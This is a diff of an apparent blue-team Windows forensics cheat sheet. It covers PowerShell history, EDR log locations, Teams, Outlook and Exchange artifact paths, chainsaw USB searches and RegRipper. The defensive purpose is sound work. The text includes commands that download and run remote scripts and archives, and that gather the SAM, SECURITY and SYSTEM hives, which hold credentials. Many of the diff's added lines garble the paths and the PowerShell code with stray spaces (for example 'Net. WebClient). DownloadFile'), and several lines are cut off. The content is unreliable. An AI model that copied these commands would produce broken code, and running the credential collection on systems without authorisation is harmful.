-<username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_his
+&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_his
 tory.txt
 Replace the username field with the username you have, and you will get a TXT file with the
 history of the users PowerShell commands - sometimes!
@@ -3055,13 +2992,13 @@ C:\Program Files\Bitdefender\Endpoint Security\Logs\system\*\*.xml
 C:\ProgramData\Bitdefender\Endpoint Security\Logs\Firewall\*.txt
 Carbon Black
 C:\ProgramData\CarbonBlack\Logs\*.log
-C:\ProgramData\CarbonBlack\Logs\AmsiEvents.log 
+C:\ProgramData\CarbonBlack\Logs\AmsiEvents.log
 Cisco AMP
 C:\Program Files\Cisco\AMP\*.db
 Cylance / Blackberry
 C:\ProgramData\Cylance\Desktop
 C:\Program Files\Cylance\Desktop\log\* log
-C:\ProgramData\Cylance\Desktop\chp.db 
+C:\ProgramData\Cylance\Desktop\chp.db
 C:\ProgramData\Cylance\Optics\Log
 Elastic Endpoint Security
 C:\program files \elastic\endpoint\state\log
@@ -3127,25 +3064,21 @@ C:\Users\*\AppData\Local\Microsoft\OneDrive\logs\
 C:\Users\*\AppData\Local\Microsoft\OneDrive\settings\
 C:\Users\*\OneDrive*\
 PST & OSTs
-C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState
-C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState
-C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState
-C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState
-C:\Users\*\AppData\Local\Packages\Microsoft.Office.OneNote_8wekyb3d8bbwe\LocalState
+C:\Users\*\AppData\Local\Packages\Microsoft. Office. OneNote_8wekyb3d8bbwe\LocalState
 C:\Users\*\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb
 C:\Users\*\AppData\Roaming\Microsoft\Teams\Local Storage\leveldb\
 C:\Users\*\AppData\Roaming\Microsoft\Teams\Cache\
-C:\Users\*\AppData\Roaming\Microsoft\Teams\desktop-config.json,lazy_ntfs,JSON config file for Teams      
+C:\Users\*\AppData\Roaming\Microsoft\Teams\desktop-config.json,lazy_ntfs,JSON config file for Teams
 C:\Users\*\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft
 C:\Users\*\Documents\Outlook Files\*.pst
 C:\Users\*\Documents\Outlook Files\*.ost
 C:\Users\*\AppData\Local\Microsoft\Outlook\*.pst
 C:\Users\*\AppData\Local\Microsoft\Outlook\*.ost
 C:\Users\*\AppData\Local\Microsoft\Outlook\*.nst
-C:\Users\*\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\. #Attachments temporarily go here
+C:\Users\*\AppData\Local\Microsoft\Windows\INetCache\Content. Outlook\. #Attachments temporarily go here
 Exchange:
 C:\Program Files\Microsoft\Exchange Server\*\Logging\
-C:\Windows\Microsoft.NET\Framework*\v*\Temporary ASP.NET Files\*\
+C:\Windows\Microsoft. NET\Framework*\v*\Temporary ASP. NET Files\*\
 C:\inetpub\wwwroot\aspnet_client\*\*\
 C:\Inetpub\wwwroot\aspnet_client\system_web\*\*
 C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\*\*\
@@ -3206,7 +3139,7 @@ and use chainsaw in search mode
 You can probably also find some stuff from the Jumplist and LNK artefacts that have some
 relevance to your USB investigation.
 chainsaw search ./ -s "medicat"
-chainsaw search ./ -e "1006" 
+chainsaw search ./ -e "1006"
 # EventID 1006, for USB investigations, offers verbose results but is a good un' https://df-stream.com/2018/07/partition-diagnostic-event-log-and-usb-device-tracking-p2/
 Reg Ripper
 Harlan Carvey knows how to write a pretty mean tool or two. Reg Ripper is a forensic one
@@ -3218,9 +3151,20 @@ wget -useb https://gist.githubusercontent.com/Purp1eW0lf/6bbb2c1e22fe64a151d7ab9
 # Take your registry collected files from the above script. Prepare them for analysis
 expand-archive C:\Users\*\Desktop\Huntress_Registry_Collection_2022_Dec_30_Fri_UTC+
 # then download Reg Ripper and unzip it
-(New-Object Net.WebClient).DownloadFile("https://github.com/keydet89/RegRipper3.0/archive/refs/heads/master.zip"
+(New-Object Net. WebClient). DownloadFile("https://github.com/keydet89/RegRipper3.0/archive/refs/heads/master.zip"
 expand-archive C:\rip_master.zip C:\
 #Recursively run reg ripper now
-GCI "C:\registry_hives\" -recurse -force -include SYSTEM, SAM, SECURITY, SOFTWARE, *.dat, *.hve | 
+GCI "C:\registry_hives\" -recurse -force -include SYSTEM, SAM, SECURITY, SOFTWARE, *.dat, *.hve |
 #run with timeline option
 GCI "C:\registry_hives\" -recurse -force -include SYSTEM, SAM, SECURITY, SOFTWARE, *.dat, *.hve |
+
+---
+
+## Educational Use Notice
+
+This content is provided strictly for educational purposes, defensive security awareness, system administration, diagnostics, and ethical learning environments.
+
+Always obtain proper authorization before testing systems or networks. The information published on this website is intended to promote responsible security practices, auditing, monitoring, and infrastructure hardening.
+
+---
+
